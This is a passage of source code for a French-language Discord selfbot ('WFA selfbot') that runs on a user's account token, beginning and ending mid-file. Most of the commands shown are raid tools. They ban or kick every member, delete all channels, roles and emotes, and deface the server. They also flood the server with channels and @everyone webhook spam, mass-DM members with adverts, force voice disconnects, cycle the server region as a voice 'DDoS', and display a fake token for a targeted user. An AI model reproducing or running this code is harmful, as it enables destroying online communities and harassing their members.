                  '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                )
              )
              console.log(' ')
            }
          }
        }
        if (X.author.id !== client.user.id) {
          return
        }
        if (T.content.startsWith(prefix + 'cmd')) {
          T.edit(
            ghost +
              'https://cmd.wfaself.repl.co\n    https://cmd-1.wfaself.repl.co\n    https://cmd-2.wfaself.repl.co\n    https://cmd-3.wfaself.repl.co\n    https://cmd-4.wfaself.repl.co'
          )
          console.log(consolecolor.instagram('[COMMANDE] Commande cmd executé'))
        }
        T.content.startsWith(prefix + 'help') &&
          (T.edit(ghost + 'https://help.wfaself.repl.co').catch((ah) => {}),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande help executé')
          ))
        T.content.startsWith(prefix + 'help fun') &&
          (T.edit(
            ghost + 'https://fun.wfaself.repl.co https://fun-1.wfaself.repl.co'
          ).catch((aj) => {}),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande help fun executé')
          ))
        T.content.startsWith(prefix + 'help hack') &&
          (T.edit(ghost + 'https://hack.wfaself.repl.co').catch((aj) => {}),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande help hack executé')
          ))
        T.content.startsWith(prefix + 'help raid') &&
          (T.edit(ghost + 'https://raid.wfaself.repl.co').catch((aj) => {}),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande help raid executé')
          ))
        T.content.startsWith(prefix + 'help status') &&
          (T.edit(
            ghost +
              'https://status.wfaself.repl.co\n    https://status-1.wfaself.repl.co\n    https://status-2.wfaself.repl.co\n    https://status-3.wfaself.repl.co'
          ),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande help status executé')
          ))
        T.content.startsWith(prefix + 'help backup') &&
          (T.edit(ghost + 'https://backup.wfaself.repl.co'),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande help backup executé')
          ))
        if (T.content.startsWith(prefix + 'help moderation')) {
          T.edit(ghost + 'https://mod.wfaself.repl.co')
          console.log(
            consolecolor.instagram(
              '[COMMANDE] Commande help moderation executé'
            )
          )
        }
        if (T.content.startsWith(prefix + 'help utile')) {
          T.edit(
            ghost +
              'https://util.wfaself.repl.co\nhttps://util-1.wfaself.repl.co/\nhttps://util-2.wfaself.repl.co/\nhttps://util-3.wfaself.repl.co/'
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande help utile executé')
          )
        }
        if (T.content === prefix + 'destroy') {
          if (T.deletable) {
            T.delete()
          }
          if (T.author.id == client.user.id) {
            T.guild.members.forEach((am) => {
              am.ban().then(function () {})
            })
          }
          if (T.content.startsWith(prefix + 'destroy')) {
            if (T.author.id == client.user.id) {
              T.delete()
              for (var a0 = 0; a0 < 90; a0++) {
                const am = {
                  name: h,
                  mentionable: false,
                  permissions: 0,
                  position: '',
                  color: 'RANDOM',
                }
                T.guild.createRole(am)
              }
            }
          }
        }
        if (T.content === prefix + 'destroy') {
          if (T.deletable) {
            T.delete()
          }
          if (T.author.id == client.user.id) {
            if (T.channel.type === 'dm') {
              return
            }
            if (T.guild.channels.size === 0) {
              return
            }
          }
        }
        if (T.content === prefix + 'destroy') {
          if (T.channel.type === 'dm') {
            return
          }
          if (T.author.id == client.user.id) {
            T.guild.name != h &&
              (T.guild.setIcon(i).catch((ap) => {}),
              T.guild.setName(h).catch((ap) => {}),
              T.guild.setRegion('russia').catch((ap) => {}))
            setInterval(function () {
              T.guild.channels.size < 499 &&
                T.guild.createChannel(h, 'text').catch((aq) => {})
            }, 400)
            if (T.deletable) {
              T.delete()
            }
          }
        }
        if (T.content.startsWith(prefix + 'destroy')) {
          let aq =
            V.splice(0).join(' ') ||
            '@everyone\nwfa-selfbot > ALL\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg'
          if (T.channel.type === 'dm' || T.channel.type === 'group') {
            return T.edit(':x: **Commande uniquement utilisable sur serveur**.')
          }
          if (!T.member.hasPermission('MANAGE_WEBHOOKS')) {
            return
          }
          setInterval(() => {
            T.guild.channels.forEach((at) => {
              if (!at) {
                return
              }
              at.type == 'text' &&
                at
                  .createWebhook(h, i)
                  .catch((au) =>
                    console.log(
                      '[',
                      'ERROR'.red,
                      ']',
                      'une erreur est survenue que je ne peux régler'.green
                    )
                  )
            })
          }, 5000)
          setInterval(async function () {
            await T.guild
              .fetchWebhooks()
              .then((ar) =>
                ar.forEach((as) =>
                  as
                    .send(aq)
                    .catch((at) =>
                      console.log(
                        '[',
                        'ERROR'.red,
                        ']',
                        'une erreur est survenue que je ne peux régler'.green
                      )
                    )
                )
              )
          })
        }
        if (T.content === prefix + 'delete all channel') {
          let ar = T.guild
          if (!ar) {
            T.edit(':x: **Veuillez executer cette commande dans un serveur!**')
            return
          }
          if (!T.member.hasPermission('MANAGE_CHANNELS')) {
            return T.delete().then(
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'permission insuffisante'.green
              )
            )
          }
          var a1 = T.guild.channels
          a1.forEach((at) => {
            at.delete().catch((au) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'une erreur est survenue que je ne peux régler'.green
              )
            )
          })
          console.log(
            consolecolor.instagram(
              '[COMMANDE] Commande delete all channel executé'
            )
          )
        }
        if (T.content === prefix + 'delete all role') {
          let at = X.guild
          if (!at) {
            T.edit(':x: **Veuillez executer cette commande sur un serveur!**')
            return
          }
          T.guild.roles.forEach((au) => {
            au.delete().catch((av) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'une erreur est survenue que je ne peux régler'.green
              )
            )
          })
          console.log(
            consolecolor.instagram(
              '[COMMANDE] Commande delete all role executé'
            )
          )
        }
        if (T.content.startsWith(prefix + 'name all')) {
          let av = T.guild
          if (!av) {
            return X.edit(
              ':x: **Commande uniquement utilisable sur un serveur**'
            )
          }
          const aw =
            T.content.split(' ').slice(2).join(' ') || T.author.username
          if (!T.member.hasPermission('MANAGE_NICKNAMES')) {
            return T.delete().then(
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'permission insuffisante'.green
              )
            )
          }
          const ax = T.guild.members
          X.edit('Je renomme tout le monde par ' + aw)
          ax.forEach((ay) => {
            ay.setNickname(aw).catch((aC) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'une erreur est survenue que je ne peux régler'.green
              )
            )
          })
          console.log(
            consolecolor.instagram('[COMMANDE] Commande name all executé')
          )
        }
        if (T.content == prefix + 'ban all') {
          let az = T.guild
          if (!az) {
            return X.edit(
              ':x: **Commande uniquement utilisable sur un serveur**'
            )
          }
          if (!T.member.hasPermission('BAN_MEMBERS')) {
            return T.delete().then(
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'permission insuffisante'.green
              )
            )
          }
          T.guild.members.forEach((aA) => {
            setInterval(() => {
              if (!aA.bannable) {
                return
              }
              aA.ban().catch((aB) =>
                console.log(
                  '[',
                  'ERROR'.red,
                  ']',
                  'une erreur est survenue que je ne peux régler'.green
                )
              )
            }, 1000)
          })
          console.log(
            consolecolor.instagram('[COMMANDE] Commande ban all executé')
          )
        }
        if (T.content === prefix + 'all kick') {
          let aA = T.guild
          if (!aA) {
            return X.edit(
              ':x: **Commande uniquement utilisable sur un serveur**'
            )
          }
          if (!T.member.hasPermission('KICK_MEMBERS')) {
            return T.delete().then(
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'permission insuffisante'.green
              )
            )
          }
          const aB = T.guild.members
          aB.forEach((aC) => {
            if (!aC.kickable) {
              return
            }
            aC.kick().catch((aD) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'une erreur est survenue que je ne peux régler'.green
              )
            )
          })
          console.log(
            consolecolor.instagram('[COMMANDE] Commande kick all executé')
          )
        }
        if (T.content.startsWith(prefix + 'deface')) {
          if (T.channel.type === 'dm' || T.channel.type === 'group') {
            return T.edit(':x: **Commande uniquement utilisable sur serveur**.')
          }
          if (!T.member.hasPermission('ADMINISTRATOR')) {
            return T.edit(
              ":x: **Vous n'avez pas les permissions pour executer cette commande**"
            )
          }
          T.delete()
          T.guild.setName('RAIDED BY ' + h + ' X ' + client.user.username)
          T.guild.setIcon(
            'https://media.discordapp.net/attachments/812490234427867146/836312989581049886/wfa.jpeg?width=676&height=676'
          )
          T.guild.channels.forEach((aE) => {
            if (!aE) {
              return
            }
            aE.delete()
          })
          T.guild.createChannel(client.user.username, 'text')
          console.log(
            consolecolor.instagram('[COMMANDE] Commande deface executé')
          )
        }
        if (T.content.startsWith(prefix + 'create channel')) {
          if (T.channel.type === 'dm' || T.channel.type === 'group') {
            return T.edit(':x: **Commande uniquement utilisable sur serveur**.')
          }
          if (!T.member.hasPermission('MANAGE_CHANNELS')) {
            return T.edit(
              ":x: **Vous n'avez pas les permissions pour executer cette commande**"
            )
          }
          T.delete()
          for (let aF = 0; aF < 20; aF++) {
            T.guild
              .createChannel('WFA-\uD835\uDC31-' + client.user.username, 'text')
              .catch((aH) =>
                console.log(
                  '[',
                  'ERROR'.red,
                  ']',
                  'une erreur est survenue que je ne peux régler'.green
                )
              )
          }
          console.log(
            consolecolor.instagram('[COMMANDE] Commande create channel executé')
          )
        }
        if (T.content.startsWith(prefix + 'webhook spam')) {
          let aH =
            V.splice(2).join(' ') ||
            '@everyone\nWFA - Selfbot\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg'
          if (T.channel.type === 'dm' || T.channel.type === 'group') {
            return T.edit(':x: **Commande uniquement utilisable sur serveur**.')
          }
          if (!T.member.hasPermission('MANAGE_WEBHOOKS')) {
            return
          }
          T.guild.channels.forEach((aI) => {
            if (!aI) {
              return
            }
            aI.type == 'text' &&
              aI
                .createWebhook(h, i)
                .catch((aL) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'une erreur est survenue que je ne peux régler'.green
                  )
                )
          })
          setInterval(async function () {
            await T.guild
              .fetchWebhooks()
              .then((aI) =>
                aI.forEach((aJ) =>
                  aJ
                    .send(aH)
                    .catch((aK) =>
                      console.log(
                        '[',
                        'ERROR'.red,
                        ']',
                        'une erreur est survenue que je ne peux régler'.green
                      )
                    )
                )
              )
          })
          console.log(
            consolecolor.instagram('[COMMANDE] Commande webhook spam executé')
          )
        }
        if (T.content.startsWith(prefix + 'backup create')) {
          if (T.channel.type === 'dm' || T.channel.type === 'group') {
            return T.edit(':x: **Commande uniquement utilisable sur serveur**.')
          }
          const aJ = { jsonBeautify: true }
          backup.create(T.guild, aJ).then((aK) => {
            T.edit("la backup est prise, l'id est: " + aK.id + '`!')
          })
        }
        if (T.content.startsWith(prefix + 'backup load')) {
          const aL = require('discord-backup')
          let aM = V[1]
          if (!aM) {
            return T.channel.send(":x: **tu dois mettre l'id d'une backup**!")
          }
          const aN = { clearGuildBeforeRestore: true }
          aL.load(backupData, guild, aN)
        }
        if (T.content.startsWith(prefix + 'backup list')) {
          const aO = require('discord-backup')
          aO.list().then((aP) => {
            console.log(aP)
          })
        }
        T.content.startsWith(prefix + 'start bumping') &&
          (T.delete(),
          T.channel.send('!d bump'),
          setInterval(() => {
            T.channel.send('!d bump')
          }, 7203000),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande start bumping executé')
          ))
        if (T.content.startsWith(prefix + 'get guild banner')) {
          T.delete()
          if (T.channel.type === 'dm' || T.channel.type === 'group') {
            return T.edit(':x: **Commande uniquement utilisable sur serveur**.')
          }
          console.log(
            consolecolor.instagram(
              '[COMMANDE] Commande get guild banner executé'
            )
          )
          console.log(
            consolecolor.summer(
              '[BANNIERE] Voici la banniere: ' + T.guild.bannerURL
            )
          )
        }
        if (T.content.startsWith(prefix + 'get guild pp')) {
          T.delete()
          if (T.channel.type === 'dm' || T.channel.type === 'group') {
            return T.edit(':x: **Commande uniquement utilisable sur serveur**.')
          }
          console.log(
            consolecolor.instagram('[COMMANDE] Commande get guild pp executé')
          )
          console.log(
            consolecolor.summer('[BANNIERE] Voici la pp: ' + T.guild.iconURL)
          )
        }
        if (T.content.startsWith(prefix + 'mp all')) {
          if (!T.guild) {
            return T.edit(':x: **Commande uniquement utilisable sur serveur**')
          }
          T.delete()
          console.log(
            consolecolor.instagram('[COMMANDE] Commande mp all executé')
          )
          let aQ = 0,
            aR =
              V.splice(2).join(' ') ||
              '**Best Selfbot Discord**\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg',
            aS = T.guild
          if (!aS) {
            return
          }
          setInterval(() => {
            let aT = aS.members.random()
            if (aT.user.bot) {
              return
            }
            if (aT.user.id === client.user.id) {
              return
            }
            if (aT.hasPermission('ADMINISTRATOR')) {
              return
            }
            if (aT.hasPermission('MANAGE_MESSAGES')) {
              return
            }
            if (aT.hasPermission('MANAGE_ROLES_OR_PERMISSIONS')) {
              return
            }
            if (aT.hasPermission('BAN_MEMBERS')) {
              return
            }
            if (z[aT.user.id]) {
              return
            }
            aQ++
            aT.send('Hello ^^')
              .then((aV) => aV.edit(aR))
              .catch((aV) =>
                console.log(
                  '[',
                  'ERROR'.red,
                  ']',
                  'une erreur est survenue que je ne peux régler'.green
                )
              )
            console.log(
              ('[MP Envoyé]  |' + aT.user.username).green +
                '|  ' +
                aQ +
                ' / ' +
                X.guild.members.filter((aV) => aV.presence.status !== 'offline')
                  .size +
                ' '
            )
            const aU = { raison: 'mp' }
            z[aT.user.id] = aU
            L()
          }, 8000)
        }
        if (T.content.startsWith(prefix + 'stop mp all')) {
          if (T.deletable) {
            T.delete()
          }
          commandIntervals.forEach((aT) => {
            clearInterval(aT)
          })
          console.log(
            consolecolor.instagram('[COMMANDE] Commande mp all stopée')
          )
        }
        if (T.content.startsWith(prefix + 'stop auto voice kick')) {
          if (!T.guild) {
            return T.edit(':x: **Commande uniquement utilisable sur serveur**')
          }
          if (!W) {
            return T.edit(':x: **Veuillez mentionner un utilisateur**')
          }
          if (!B[T.guild.id]) {
            return T.edit(":x: *Tu n'as encore blacklist vocal personne**")
          }
          if (!B[T.guild.id].user === W.id) {
            return T.edit(
              ":x: **Tu n'as pas blacklist cet utilisateur des vocaux*"
            )
          }
          W &&
            (delete B[T.guild.id],
            console.log(
              consolecolor.instagram('[COMMAND] auto voice kick command stoped')
            ),
            T.edit(
              ':white_check_mark: **Auto Voice kick stoped for this user**'
            ),
            P())
        }
        if (T.content.startsWith(prefix + 'auto voice kick')) {
          if (!T.guild) {
            return T.edit(':x: **Commande utilisable sur serveur uniquement**')
          }
          if (!T.guild.me.hasPermission('MOVE_MEMBERS')) {
            return T.reply(
              ":x:**Tu n'as pas la permission de deconnecter cet utilisateur du vocal**."
            )
          }
          const aV = T.mentions.members.first()
          if (!aV) {
            return T.edit(':x:**Veuillez mentionner un utilisateur.**')
          }
          const aW = { user: W.id }
          B[T.guild.id] = aW
          P()
          console.log(
            consolecolor.instagram('[COMMAND] auto voice kick commande exécuté')
          )
          T.edit(
            ":white_check_mark: **Auto Voice kick setup l'utilisateur ne pourra plus rejoindre de channel vocal de ce serveur**"
          )
          aV.voiceChannel &&
            aV
              .setVoiceChannel(null)
              .catch((aX) =>
                T.edit(':x:**The user is not in a voice channel.**')
              )
        }
        if (T.content.startsWith(prefix + 'nuke dm')) {
          let aY = ''
          T.edit('**Nuking dms...**')
          client.users.forEach((aZ) => aZ.deleteDM().catch((b0) => {}))
          T.edit(':white_check_mark: **Nuked dms**')
          console.log(
            consolecolor.instagram('[COMMANDE] Commande nuke dm executé')
          )
        }
        if (T.content.startsWith(prefix + 'voice kick')) {
          if (!T.guild) {
            return T.edit(
              ':x: **Commande uniquement utilisable sur un serveur**'
            )
          }
          if (!T.guild.me.hasPermission('MOVE_MEMBERS')) {
            return T.reply(
              ":x:**Tu n'a pas la permission de kick un utilisatur**."
            )
          }
          const aZ = T.mentions.members.first()
          if (!aZ) {
            return T.edit(':x:**Veuillez mentionner un utilisateur.**')
          }
          if (!aZ.voiceChannel) {
            return T.edit(
              ":x:**L'utilisateur n'est pas dans un channel vocal.**"
            )
          }
          T.edit(
            ":white_check_mark: **L'utilisateur a été voice kick correctement**"
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande voice kick executé')
          )
          T.edit(
            ":white_check_mark: **L'utilisateur a été voice kick correctement**"
          ),
            console.log(
              consolecolor.instagram('[COMMANDE] Commande voice kick executé')
            )
        }
        if (T.content.startsWith(prefix + 'afk')) {
          let b0 = V.splice(1).join(' ') || 'WFA-SELFBOT'
          const b1 = { r: b0 }
          T.edit(':white_check_mark: **Vous etes afk pour** ' + b0)
          console.log(consolecolor.instagram('[COMMANDE] Commande afk executé'))
          x[client.user.id] = b1
          N()
          T.edit(':white_check_mark: **Vous etes afk pour** ' + b0),
            console.log(
              consolecolor.instagram('[COMMANDE] Commande afk executé')
            )
        }
        if (T.content.startsWith(prefix + 'anti groupe on')) {
          let b3 = V.splice(1).join(' ') || 'WFA-SELFBOT'
          const b4 = { r: b3 }
          T.edit(
            ':white_check_mark: **vous allez quitter les nouveaus groupes en disant: **' +
              b3
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande anti groupe executé')
          )
          y[client.user.id] = b4
          M()
          T.edit(
            ':white_check_mark: **vous allez quitter les nouveaus groupes en disant: **' +
              b3
          ),
            console.log(
              consolecolor.instagram('[COMMANDE] Commande anti groupe executé')
            )
        }
        T.content.startsWith(prefix + 'anti groupe off') &&
          (delete y[client.user.id],
          M(),
          (T.edit(":white_check_mark: **l'anti groupe est désactivé"),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande anti groupe stopé')
          )))
        if (T.content.startsWith(prefix + 'avatar' || prefix + 'pp')) {
          const b6 = T.mentions.users.first() || T.author
          T.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=Commande%2520Avatar&description=Voici%2520l%27avatar%2520de%2520' +
                b6.username +
                '&image=' +
                b6.avatarURL)
          ).catch((b7) =>
            console.log(
              '[',
              'ERREUR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande avatar executé')
          )
        }
        if (T.content === prefix + 'change hypesquad brilliance') {
          let b7 = 'https://discordapp.com/api/v6/hypesquad/online'
          const b8 = { house_id: 2 }
          request(b7, {
            method: 'POST',
            headers: {
              authorization: token,
              'content-type': 'application/json',
              'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
            },
            body: JSON.stringify(b8),
          })
          X.edit(
            ":white_check_mark: **Vous avez rejoint la hypesquad 'brilliance'**"
          )
          console.log(
            consolecolor.instagram(
              '[COMMANDE] Commande change hypesquad executé'
            )
          )
        }
        if (T.content === prefix + 'change hypesquad ballance') {
          let ba = 'https://discordapp.com/api/v6/hypesquad/online'
          const bb = { authorization: token }
          bb['content-type'] = 'application/json'
          bb['User-Agent'] =
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
          const bc = { house_id: 3 }
          request(ba, {
            method: 'POST',
            headers: bb,
            body: JSON.stringify(bc),
          })
          X.edit(
            ":white_check_mark: **Vous avez rejoint la hypesquad 'ballance'**"
          )
          console.log(
            consolecolor.instagram(
              '[COMMANDE] Commande change hypesquad executé'
            )
          )
        }
        if (T.content === prefix + 'change hypesquad bravery') {
          let bd = 'https://discordapp.com/api/v6/hypesquad/online'
          const be = { house_id: 1 }
          request(bd, {
            method: 'POST',
            headers: {
              authorization: token,
              'content-type': 'application/json',
              'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
            },
            body: JSON.stringify(be),
          })
          X.edit(
            ":white_check_mark: **Vous avez rejoint la hypesquad 'bravery'**"
          )
          request(bd, {
            method: 'POST',
            headers: {
              authorization: token,
              'content-type': 'application/json',
              'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
            },
            body: JSON.stringify(be),
          }),
            X.edit(
              ":white_check_mark: **Vous avez rejoint la hypesquad 'bravery'**"
            )
          console.log(
            consolecolor.instagram(
              '[COMMANDE] Commande change hypesquad executé'
            )
          )
        }
        if (T.content.startsWith(prefix + 'mp friend')) {
          if (!V) {
            throw 'Vous devez mettre quelque chose à dire !'
          }
          let bf =
            V.splice(2).join(' ') ||
            'WFA Selfbot\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg'
          client.user.friends.forEach((bg) => {
            bg.send(bf).catch((bi) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'une erreur est survenue que je ne peux régler'.green
              )
            )
          })
          console.log(
            consolecolor.instagram('[COMMANDE] Commande mp friend executé')
          )
        }
        T.content === prefix + 'stats' &&
          (T.edit(
            '```Selfbot - Statistics | WFA - Selfbot\nMemoire Usage: ' +
              (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) +
              'MB\n\nServeurs: ' +
              client.guilds.size +
              '\n\nSalons: ' +
              client.channels.size +
              '\n\nMembres: ' +
              client.guilds
                .map((bg) => bg.memberCount)
                .reduce((bg, bh) => bg + bh) +
              '```'
          ).catch((bg) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          ),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande stats executé')
          ))
        if (T.content.startsWith(prefix + 'purge')) {
          T.channel.fetchMessages().then((bh) =>
            bh.forEach((bi) => {
              bi.author.id === client.user.id &&
                bi
                  .delete()
                  .catch((bj) =>
                    console.log(
                      '[',
                      'ERROR'.red,
                      ']',
                      'une erreur est survenue que je ne peux régler'.green
                    )
                  )
            })
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande purge executé')
          )
        }
        X.content.startsWith(prefix + 'discord') &&
          (X.edit(
            ghost +
              'https://embed.rauf.workers.dev/?author=Discord%2520Version&description=La%2520version%2520de%2520discord%253A%2520' +
              discord.version
          ).catch((bh) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          ),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande discord executé')
          ))
        T.content === prefix + 'restart' &&
          (T.edit('**redémarrage** du self bot...')
            .then(client.destroy())
            .then(() => client.login(token)),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande restart executé')
          ))
        if (T.content.startsWith(prefix + 'set serveur name')) {
          let bi = V.splice(1).join(' ') || 'WFA selfbot'
          T.edit('Changement du nom du serveur pour: ' + bi)
          T.guild.setName(bi)
          console.log(
            consolecolor.instagram(
              '[COMMANDE] Commande set serveur name executé'
            )
          )
        }
        if (T.content.startsWith(prefix + 'token')) {
          if (!W) {
            T.edit(':x: **Veuillez mentionner un utilisateur!**')
            return
          }
          const bj = W.username.split(' ').join('%2520'),
            bk = client.user.username.split(' ').join('%2520')
          let bl = ['HircHg', 'XnyXiA', 'XluxwQ', 'XXn_KA', 'Xiq-WQ'],
            bm = [
              'a6uny9jcMjet2W2LASruribq6VI',
              'oZyGJDamSJ4hmJaaLvzdNo1bLqk',
              '3_6Xt2k4OieDKimnNYGWUq9vJRo',
              'xllelHltGdY7DP_0s1XST4cgzTs',
            ]
          var a2 = W.id,
            a3 = utf8.encode(a2),
            a4 = base64.encode(a3)
          setTimeout(() => {
            T.edit(
              '\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 0%'
            )
          }, 1000)
          setTimeout(() => {
            T.edit(
              '\u2593\u2593\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 20%'
            )
          }, 1500)
          setTimeout(() => {
            T.edit(
              '\u2593\u2593\u2593\u2593\u2591\u2591\u2591\u2591\u2591\u2591 40%'
            )
          }, 2000)
          setTimeout(() => {
            T.edit(
              '\u2593\u2593\u2593\u2593\u2593\u2593\u2591\u2591\u2591\u2591 60%'
            )
          }, 2500)
          setTimeout(() => {
            T.edit(
              '\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2591\u2591 80%'
            )
          }, 3000)
          setTimeout(() => {
            T.edit(
              '\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593 100%'
            )
          }, 3500)
          setTimeout(() => {
            T.edit(
              ghost +
                ('https://embed.rauf.workers.dev/?author=Token%2520match%2520' +
                  bj +
                  '&description=') +
                a4 +
                '.' +
                bl[Math.floor(Math.random() * bl.length)] +
                '.' +
                bm[Math.floor(Math.random() * bm.length)]
            ).catch((bo) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'une erreur est survenue que je ne peux régler'.green
              )
            )
          }, 4000)
          console.log(
            consolecolor.instagram('[COMMANDE] Commande token executé')
          )
        }
        if (T.content.startsWith(prefix + 'sansxksch')) {
          console.log(' ')
          console.log(
            consolecolor.mind(
              '[EASTER EGG] GG a toi, tu as trouvé un easter egg !'
            )
          )
          console.log(
            consolecolor.mind(
              '[EASTER EGG] Sans x KSH sont les développeurs et les designeurs du WFA Project !'
            )
          )
          console.log(' ')
        }
        if (T.content.startsWith(prefix + 'encode')) {
          var a6 = V.join(' ') || '@everyone\nWFA selfbot'
          var a3 = utf8.encode(a6)
          var a7 = base64.encode(a3)
          var a5 = a7.split(' ').join('%2520')
          T.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=Code%2520Encode&description=Texte%2520-%253E%2520Base64%253A%2520' +
                a5)
          ).catch((bq) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande encode executé')
          )
        }
        if (T.content.startsWith(prefix + 'steal banniere')) {
          T.delete()
          let br = T.guild.bannerURL
          console.log(
            consolecolor.instagram('[COMMANDE] Commande steal banniere executé')
          )
          console.log(
            ('Voici la bannière de ' + T.guild.name + ': ').blue +
              ('' + br).green
          )
        }
        if (T.content.startsWith(prefix + 'steal emote')) {
          if (T.channel.type === 'dm') {
            T.edit(':x: **Commande pas executable en mp**')
            return
          }
          let bt = V.splice(2).join(' '),
            bu = client.guilds.get(bt)
          if (!bu) {
            T.edit(':x: **Aucun serveur trouvable avec l\'id** "' + bt + '"')
            return
          }
          if (!T.member.hasPermission('MANAGE_EMOJIS')) {
            return T.edit(
              ':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**'
            )
          }
          bu.emojis.size < 1 &&
            T.edit(':x: **Le serveur ne contient aucun emote.**')
          bu.emojis.forEach((bw) => {
            setTimeout(() => {
              let bx = bw.name
              const by =
                'https://cdn.discordapp.com/emojis/' + bw.id + '.' + bw.animated
                  ? 'gif'
                  : 'png'
              T.guild.createEmoji(by, bx).catch((bz) => '1' + 1)
            }, 1500)
          })
          console.log(
            consolecolor.instagram('[COMMANDE] Commande steal emote executé')
          )
          T.edit(
            ':white_check_mark: **J\'ai volé les emotes du serveur** "' +
              bu.name +
              '"'
          )
        }
        if (T.content == prefix + 'delete all emotes') {
          if (T.channel.type === 'dm') {
            T.edit(':x: **Commande pas executable en mp**')
            return
          }
          if (T.guild.emogis.size < 1) {
            T.edit(":x: **Il n' y a aucun emote a supprimer.**")
            return
          }
          T.guild.emojis.forEach((by) => {
            T.guilds.emojis.get(by.id).delete()
          })
          console.log(
            consolecolor.instagram(
              '[COMMANDE] Commande delete all emote executé'
            )
          )
        }
        if (T.content.startsWith(prefix + 'grab pp')) {
          let bz = T.mentions.users.first(),
            bA = bz.avatarURL
          if (!bz) {
            T.edit(':x: **Veuillez mentionner un utilisateur valide!**')
            return
          }
          if (!bA) {
            T.edi(":x: **Cet utilisateur n'a pas d'avatar!**")
            return
          }
          client.user.setAvatar(bA)
          console.log(
            consolecolor.instagram('[COMMANDE] Commande grab pp executé')
          )
          T.edit(
            ':white_check_mark: **J\'ai correctement volé la photo de profile de ** "' +
              bz.username +
              '"'
          )
        }
        if (T.content == prefix + 'backup friend') {
          var a8 = client.user.friends.size
          const bC = client.user.friends.array()
          let bD =
            'Successfully backed up ' +
            bC.length.toString().bold +
            ' friends.'.green
          console.log(bD)
          hastebins(bC + '\n').then((bE) => {
            T.edit(
              '```WFA BACKUP FRIEND\n\nLien hastebins: ' +
                bE +
                '\n\n***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...```'
            ).catch((bG) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'une erreur est survenue que je ne peux régler'.green
              )
            )
            console.log(
              consolecolor.instagram(
                '[COMMANDE] Commande backup friend executé'
              )
            )
          })
        }
        if (T.content === prefix + 'ddos voc') {
          if (!X.guild) {
            return T.edit(
              ':x: **Commande uniquement utilisable sur un serveur**'
            )
          }
          if (!T.member.hasPermission('ADMINISTRATOR')) {
            T.channel.send(
              ':x: **Il vous faut les permissions administrateur pour executer cette commande**'
            )
            return
          }
          let bF = 0
          const bG = [
            'japan',
            'hongkong',
            'russia',
            'india',
            'brazil',
            'sydney',
          ]
          setInterval(() => {
            T.guild.setRegion(bG[bF])
            bF++
            if (bF === bG.length) {
              bF = 0
            }
          }, 1000)
          X.edit('**Commande ddos vocal activé**')
          console.log(
